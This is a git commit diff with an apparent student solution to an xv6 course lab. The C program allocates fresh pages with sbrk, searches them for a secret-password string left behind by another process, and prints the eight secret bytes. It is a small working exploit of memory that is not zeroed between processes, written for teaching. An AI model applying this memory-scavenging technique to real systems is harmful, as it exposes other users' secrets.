e0a9bc665f2972ac06ee9cb74952ba8234972ffe
Summerflower5 <1282700366@qq.com>
2025-06-20 23:43:44 +0800

    lab2 attack finished

--- user/attack.c
+++ user/attack.c
@@ -8,6 +8,20 @@ main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
+  const char *target = "my very very very secret pw is:   ";
+  char *end = sbrk(PGSIZE*32);
+  for(int i = 0 ; i < 32 ; i++){
+    int match = 0;
+    for(int j = 0 ; j < strlen(target) ; j++){
+      if(*(end + PGSIZE*i + j) == target[j]){
+        match++;
+      }
+    }
+    if(match > strlen(target)>>1){
+      write(2, end + PGSIZE*i + 32, 8);
+      break;
+    }
+  }
 
-  exit(1);
+  exit(0);
 }
